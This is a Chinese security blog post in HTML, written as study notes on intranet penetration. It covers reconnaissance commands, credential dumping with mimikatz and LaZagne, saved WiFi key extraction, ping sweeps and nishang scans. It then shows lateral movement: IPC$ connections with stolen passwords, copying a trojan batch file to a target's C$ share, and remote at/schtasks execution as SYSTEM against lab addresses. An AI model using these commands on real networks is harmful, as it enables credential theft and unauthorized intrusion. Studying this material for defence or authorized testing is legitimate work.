<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>内网安全 | Dralin's SweetNest</title><meta name="author" content="DralinF"><meta name="copyright" content="DralinF"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="内网安全|域横向|工作组|局域网探针 内网|基本概念基本名词1、DMZ区，即隔离区或非军事化区，是内网和外网间的缓冲区，用于放置一些必须公开的服务器，如web服务器。在保护了内部网络的同时，解决了安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题。2、工作组（Work Group）是局域网中的一个概念。它是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管">
<meta property="og:type" content="article">
<meta property="og:title" content="内网安全">
<meta property="og:url" content="http://fzsecurity-github.github.io/2023/12/05/neiwangSecury/index.html">
<meta property="og:site_name" content="Dralin&#39;s SweetNest">
<meta property="og:description" content="内网安全|域横向|工作组|局域网探针 内网|基本概念基本名词1、DMZ区，即隔离区或非军事化区，是内网和外网间的缓冲区，用于放置一些必须公开的服务器，如web服务器。在保护了内部网络的同时，解决了安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题。2、工作组（Work Group）是局域网中的一个概念。它是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://fzsecurity-github.github.io/img/reHe.jpg">
<meta property="article:published_time" content="2023-12-05T13:51:20.000Z">
<meta property="article:modified_time" content="2023-12-17T09:13:55.537Z">
<meta property="article:author" content="DralinF">
<meta property="article:tag" content="内网安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://fzsecurity-github.github.io/img/reHe.jpg"><link rel="shortcut icon" href="/img/sweetwo.png"><link rel="canonical" href="http://fzsecurity-github.github.io/2023/12/05/neiwangSecury/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: DralinF","link":"链接: ","source":"来源: Dralin's SweetNest","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-right"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '内网安全',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-12-17 17:13:55'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/myStyle.css"><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="/css/custom.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">28</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/reHe.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Dralin's SweetNest"><span class="site-name">Dralin's SweetNest</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网安全</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-05T13:51:20.000Z" title="发表于 2023-12-05 21:51:20">2023-12-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-17T09:13:55.537Z" title="更新于 2023-12-17 17:13:55">2023-12-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">10.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>36分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="内网安全"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="内网安全-域横向-工作组-局域网探针"><a href="#内网安全-域横向-工作组-局域网探针" class="headerlink" title="内网安全|域横向|工作组|局域网探针"></a>内网安全|域横向|工作组|局域网探针</h1><p><img src="https://pic.imgdb.cn/item/656f2bd2c458853aef75e27b.webp"><br><img src="https://pic.imgdb.cn/item/656f3821c458853aefbb0c39.webp"></p>
<h2 id="内网-基本概念"><a href="#内网-基本概念" class="headerlink" title="内网|基本概念"></a>内网|基本概念</h2><p><code>基本名词</code><br>1、DMZ区，即隔离区或非军事化区，是内网和外网间的缓冲区，用于放置一些必须公开的服务器，如web服务器。在保护了内部网络的同时，解决了安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题。<br>2、工作组（Work Group）是局域网中的一个概念。它是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理，适合小型网络（不需要域管理器）。<br>3、域环境：和工作组类似，但是由域控制器（DC）–相当于root，统一管理，更适合大型网络<br>域环境不等于局域网。<br>4、活动目录(AD)：相当于功能主机，域内实现什么功能由此管理。<br>5、单域、父域、子域;父域、子域这两个概念在多域情况下会产生。<br>6、域数、域森林<br><code>基本认知</code><br>1、Linux域渗透问题<br>Linux实现域的功能需要安装LDAP，功能不如域强且技术要求高，较少被使用，所以大部分是用win server实现域的功能。<br>2、局域网技术适用问题<br>有些局域网内的攻击方法在域内不生效<br>域通常指的是互联网上的一个区域，而局域网是指一个特定地理区域内的网络。因此，域和局域网并不等同。域通常指的是一个由一组计算机和网络设备组成的逻辑组织，可以跨越不同的地理位置，而局域网通常指的是一个特定地理区域内的网络，比如一个办公室、学校或者家庭网络。因此，域和局域网是不同的概念。<br>3、大概内网安全流程问题<br>信息收集-权限提升-横向渗透-权限维持<br>4、</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对于一台主机，本地用户的权限通常比域内用户的权限更大。本地用户可以访问本地计算机上的所有资源和文件，而域内用户只能访问其在域中分配的权限和资源。但是，如果管理员在域中为某个域用户分配了本地管理员权限，那么该域用户的权限将与本地用户相同；</span><br><span class="line">域内用户可以登录到域内任意一台主机，但是权限可能没有本地用户那么高，同时，域内主机可以配置为禁止域内用户登录，只允许本地登录。</span><br></pre></td></tr></table></figure>
<h2 id="内网-初学-具体分析"><a href="#内网-初学-具体分析" class="headerlink" title="内网|初学|具体分析"></a>内网|初学|具体分析</h2><h3 id="一、基本信息收集"><a href="#一、基本信息收集" class="headerlink" title="一、基本信息收集"></a>一、基本信息收集</h3><p>旨在了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备<br>cmd输入</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systeminfo 详细信息</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> 启动服务</span><br><span class="line">tasklist 进程列表</span><br><span class="line">schtasks 计划任务</span><br></pre></td></tr></table></figure>
<p>其中，schtasks这条指令可能运行不了，可能是权限不够。</p>
<h3 id="二、网络信息收集"><a href="#二、网络信息收集" class="headerlink" title="二、网络信息收集"></a>二、网络信息收集</h3><p>旨在了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备<br>cmd输入</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span> /all 判断存在域：根据是否有“主DNS后缀”一栏判断是否存在域</span><br><span class="line"><span class="built_in">net</span> view /domain 判断存在域：能成功返回说明存在域</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> /domain 判断主域：会返回主域的时间，可以确定主域名，配合“nslookup”“<span class="built_in">ping</span>”确定IP地址</span><br><span class="line">netstat -ano 当前网络端口开放</span><br><span class="line">nslookup 域名 追踪来源地址</span><br></pre></td></tr></table></figure>
<p><code>其中</code><br>ipconfig &#x2F;all可以判断当前计算机网络环境是否为工作组&#x2F;域环境，根据是否有“主DNS后缀”一栏判断是否存在域环境。<br>假设域为god.org,有一台域控下的主机，webserver.god.org,还有dralin.webserver.god.org，那么就是多域的情况dralin.webserver.god.org是子域。<br>net time &#x2F;domain 会返回主域的时间以及主域主机的名字<br>配合以下两条命令确定域控主机的IP地址</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup &quot;<span class="built_in">net</span> <span class="built_in">time</span> /domain返回的主机名&quot; </span><br><span class="line"><span class="built_in">ping</span> <span class="built_in">net</span> &quot;<span class="built_in">time</span> /domain返回的主机名&quot;</span><br></pre></td></tr></table></figure>
<h3 id="三、用户信息收集"><a href="#三、用户信息收集" class="headerlink" title="三、用户信息收集"></a>三、用户信息收集</h3><p>旨在了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试（爆破跑密码凭据）<br>系统默认常见用户(组)身份：<br>Domain Admins：域管理员（默认对域控制器有完全控制权）<br>Domain Computers：域内机器<br>Domain Controllers：域控制器<br>Domain Guest：域访客，权限低<br>Domain Users：域用户<br>Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）<br><code>所以</code>主要攻击两个admins组内成员；知道大部分成员主机存在于域用户。<br><code>相关用户收集操作命令：</code></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">whoami /<span class="keyword">all</span> 用户权限</span><br><span class="line">net config workstation 登录信息</span><br><span class="line">net <span class="keyword">user</span> 本地用户</span><br><span class="line">net localgroup 本地用户组</span><br><span class="line">net <span class="keyword">user</span> /<span class="keyword">domain</span> 获取域用户信息</span><br><span class="line">net <span class="keyword">group</span> /<span class="keyword">domain</span> 获取域用户组信息</span><br><span class="line">wmic useraccount <span class="keyword">get</span> /<span class="keyword">all</span> 涉及域用户详细信息</span><br><span class="line">net <span class="keyword">group</span> &quot;Domain Admins&quot; /<span class="keyword">domain</span> 查询域管理员账户</span><br><span class="line">net <span class="keyword">group</span> &quot;Enterprise Admins&quot; /<span class="keyword">domain</span> 查询管理员用户组</span><br><span class="line">net <span class="keyword">group</span> &quot;Domain Controllers&quot; /<span class="keyword">domain</span> 查询域控制器</span><br></pre></td></tr></table></figure>
<p><code>要分清本地用户以及域用户，域用户在本机操作可能受限。因为本机的用户可能不属于本地管理员组且是域成员，权限不够，这也是要优先进行权限提升的原因</code></p>
<h3 id="四、凭据信息收集"><a href="#四、凭据信息收集" class="headerlink" title="四、凭据信息收集"></a>四、凭据信息收集</h3><p>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备<br><code>脚本</code><br>计算机用户 HASH，明文获取-mimikatz(win)，mimipenguin(linux)<br>计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)<br><code>计算机各种协议服务口令收集目标</code><br>1.站点源码备份文件、数据库备份文件等<br>2.各类数据库 Web 管理入口，如PHPMyAdmin<br>3.浏览器保存密码、浏览器 Cookies<br>4.其他用户会话、3389 和 ipc$连接记录、回收站内容<br>5.Windows 保存的 WIFI 密码<br>6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等<br><code>反正就是收集电脑上有保存的隐私信息，这个还是挺重要的，拿到一台保存的密码后我可以以此作为字典，继续尝试看看其他的用户是否相同密码</code><br><code>命令</code><br>Netsh WLAN show profiles 查看自己电脑连接过的wifi<br>Netsh WLAN show profile name&#x3D;”无线名称” key&#x3D;clear 查看自己电脑连接过的wifi密码，其中的“关键内容”对应的就是密码。<br><code>1、mimikatz使用方法</code><br>作用：获取本计算机的所有用户的密码（登录凭据）。<br>适用于windows系统，需要高权限账户(所以要先权限提升)<br>获取权限</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    privilege::debug</span><br></pre></td></tr></table></figure>
<p>获取计算机信息，包括用户的账号密码</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
<p><code>2、mimipenguin使用方法</code><br>适用于Linux系统，有.py和.sh两个版本，需要高权限账户<br><code>3、LaZagne使用方法</code><br>全系统适用，从浏览器、聊天软件、数据库等获取账号密码<br>以windows版为例，运行该程序，选择all</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    LaZagne<span class="selector-class">.exe</span> <span class="attribute">all</span></span><br></pre></td></tr></table></figure>
<p><code>4、XenArmor使用方法</code><br>该软件收费<br>选择“setting”，选择需要搜索密码的协议，配置被破解软件的路径，“Save”<br>选择“Recover Passwords” </p>
<h3 id="五、探针主机域控架构服务"><a href="#五、探针主机域控架构服务" class="headerlink" title="五、探针主机域控架构服务"></a>五、探针主机域控架构服务</h3><p>为后续横向思路做准备，针对应用，协议等各类攻击手法<br>探针域控制器名及地址信息<br>net time &#x2F;domain、nslookup、ping<br>探针域内存活主机及地址信息<br>nbtscan [网段]&#x2F;nbtscan 192.168.3.0&#x2F;24 第三方工具（但是要考虑免杀）</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">for</span> /L %I in (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) DO @ping -w <span class="number">1</span> -n <span class="number">1</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.%I | findstr <span class="string">&quot;TTL=&quot;</span> 自带内部命令（推荐）</span><br></pre></td></tr></table></figure>
<p>nmap、masscan，第三方PowerShell脚本<code>nishang</code>、empire等</p>
<h4 id="nishang使用方法"><a href="#nishang使用方法" class="headerlink" title="nishang使用方法"></a>nishang使用方法</h4><p>下载nishang后拖入待测主机<br>1、打开“Windows PowerShell”，来到软件所在的目录（可以Tab键补全）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    <span class="built_in">cd</span> .\Desktop\nishang-master</span><br></pre></td></tr></table></figure>
<p>2、导入模块nishang</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">Import</span>-<span class="keyword">Module</span> .\nishang.psm1</span><br></pre></td></tr></table></figure>
<p>3、设置执行策略（初次执行或导入不了时）</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">Set</span>-ExecutionPolicy <span class="comment">RemoteSigned</span></span><br></pre></td></tr></table></figure>
<p>4、获取模块nishang的命令函数<br>    Get-Command -Module nishang<br><code>成功进入后，输入对应的参数使用功能</code><br>1、获取常规计算机信息</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">   <span class="built_in">Get</span><span class="operator">-</span><span class="built_in">Information</span></span><br></pre></td></tr></table></figure>
<p>2、端口扫描（查看目录对应文件有演示语法，其他同理）</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    <span class="attribute">Invoke</span>-PortScan -StartAddress <span class="number">192.168.3.0</span> -EndAddress <span class="number">192.168.3.100</span> -ResolveHost -ScanPort</span><br></pre></td></tr></table></figure>
<p>3、其他功能：删除补丁，反弹 Shell，凭据获取等</p>
<h3 id="六、探针域内主机角色及服务信息"><a href="#六、探针域内主机角色及服务信息" class="headerlink" title="六、探针域内主机角色及服务信息"></a>六、探针域内主机角色及服务信息</h3><p>探针域内主机角色及服务信息<br>利用开放端口服务及计算机名判断<br>核心业务机器:<br>1.高级管理人员、系统管理员、财务&#x2F;人事&#x2F;业务人员的个人计算机<br>2.产品管理系统服务器<br>3.办公系统服务器<br>4.财务应用系统服务器<br>5.核心产品源码服务器（自建 SVN、GIT）<br>6.数据库服务器<br>7.文件或网盘服务器、共享服务器<br>8.电子邮件服务器<br>9.网络监控系统服务器<br>10.其他服务器（内部技术文档服务器、其他监控服务器等）</p>
<h1 id="内网安全-横向渗透"><a href="#内网安全-横向渗透" class="headerlink" title="内网安全|横向渗透"></a>内网安全|横向渗透</h1><p><img src="https://pic.imgdb.cn/item/6572bc50c458853aefcf4b6c.webp"><br>内网横向渗透攻击思路<br><code>确保是以域内用户收集信息，以本地用户去进行横向渗透（不会受域控限制）</code><br>1、通过mimikatz收集明文或hash值的密码，“net user &#x2F;domain”收集域内的用户名，“for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;””探索域内存活地址<br>2、批量扫描，用密码撞库<br>3、收集更多密码<br>4、重复2、3步 </p>
<h2 id="横向渗透-域环境"><a href="#横向渗透-域环境" class="headerlink" title="横向渗透|域环境"></a>横向渗透|域环境</h2><h3 id="域环境-传递"><a href="#域环境-传递" class="headerlink" title="域环境|传递"></a>域环境|传递</h3><p>前提：前期信息收集获取到密码的明文或hash。<br>是获取的口令以及hash的传递攻击。<br>不会被系统杀掉，因为是系统自带的命令。</p>
<h4 id="传递-at-schtasks"><a href="#传递-at-schtasks" class="headerlink" title="传递|at&amp;schtasks"></a>传递|at&amp;schtasks</h4><p>此法进行横向渗透:<code>明文（一定一定是明文）</code>传递at&amp;schtasks（计划任务）<br><code>前提：开放139、445端口</code><br>1、作用：at&amp;schtasks命令，可以在已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。<br>2、思路：获取到某域主机权限-&gt;minikatz得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做密码字典-&gt;尝试连接-&gt;创建计划任务（at|schtasks）-&gt;执行文件可为后门或者相关命令<br>3、利用流程<br>（1）、 建立IPC链接到目标主机<br>（2）、 拷贝要执行的命令脚本到目标主机<br>（3）、 查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本<br>（4）、 删除IPC链接<br>4、一些命令<br><code>（1）、建立IPC连接</code><br>连接工作组内主机</p>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\<span class="comment">[IP]</span>\ipc$<span class="string">&quot;<span class="subst">[密码]</span>&quot;</span> /user:<span class="comment">[用户名]</span></span><br></pre></td></tr></table></figure>
<p>连接域内主机</p>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\<span class="comment">[IP]</span>\ipc$<span class="string">&quot;<span class="subst">[密码]</span>&quot;</span> /user:<span class="comment">[域名]</span>\<span class="comment">[用户名]</span></span><br></pre></td></tr></table></figure>
<p><code>（2）、建立IPC常见的错误代码</code><br>1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限<br>2）51：网络问题，Windows无法找到网络路径<br>3）53：找不到网络路径，可能是IP地址错误、目标未开机、目标Lanmanserver服务未启动、有防火墙等问题<br>4）67：找不到网络名，本地Lanmanworkstation服务未启动，目标删除ipc$<br>5）1219：提供的凭据和已存在的凭据集冲突，说明已建立ipc$，需要先删除<br>6）1326：账号密码错误<br>7）1792：目标NetLogon服务未启动，连接域控常常会出现此情况<br>8）2242：用户密码过期，目标有账号策略，强制定期更改密码<br><code>（3）、建立IPC失败的原因</code><br>1）目标系统不是NT或以上的操作系统<br>2）对方没有打开ipc$共享<br>3）对方未开启139、445端口，<code>或者被防火墙屏蔽</code><br>4）输出命令、账号密码有错误</p>
<h5 id="传递-at"><a href="#传递-at" class="headerlink" title="传递|at"></a>传递|at</h5><p>at &lt; Windows2012<br>建立ipc连接</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    net <span class="keyword">use</span> \\<span class="number">192.168</span>.<span class="number">3.21</span>\ipc<span class="variable">$ </span><span class="string">&quot;Admin12345&quot;</span> /<span class="symbol">user:</span>god.org\administrator</span><br></pre></td></tr></table></figure>
<p>拷贝执行文件（木马）到目标机器</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    copy <span class="keyword">add</span>.bat \\<span class="number">192.168</span>.<span class="number">3.21</span>\<span class="keyword">c</span>$</span><br></pre></td></tr></table></figure>
<p>添加计划任务</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">   <span class="attribute">at</span> \\<span class="number">192.168.3.21</span> <span class="number">15</span>:<span class="number">47</span> c:\add.bat</span><br></pre></td></tr></table></figure>
<h5 id="传递-schtasks"><a href="#传递-schtasks" class="headerlink" title="传递|schtasks"></a>传递|schtasks</h5><p>schtasks &gt;&#x3D;Windows2012<br>建立ipc连接</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    net <span class="keyword">use</span> \\<span class="number">192.168</span>.<span class="number">3.32</span>\ipc<span class="variable">$ </span><span class="string">&quot;admin!@#45&quot;</span> /<span class="symbol">user:</span>administrator</span><br></pre></td></tr></table></figure>
<p>复制文件（木马）到其C盘</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    copy <span class="keyword">add</span>.bat \\<span class="number">192.168</span>.<span class="number">3.32</span>\<span class="keyword">c</span>$</span><br></pre></td></tr></table></figure>
<p>创建adduser任务对应执行文件</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">   schtasks <span class="string">/create</span> <span class="string">/s</span> 192.168.3.32 <span class="string">/ru</span> <span class="string">&quot;SYSTEM&quot;</span> <span class="string">/tn</span> adduser <span class="string">/sc</span> DAILY <span class="string">/tr</span> c:\add.bat <span class="string">/F</span></span><br></pre></td></tr></table></figure>
<p>运行adduser任务</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">  schtasks <span class="regexp">/run /</span>s <span class="number">192.168</span>.<span class="number">3.32</span> <span class="regexp">/tn adduser /i</span></span><br></pre></td></tr></table></figure>
<p>删除adduser任务</p>
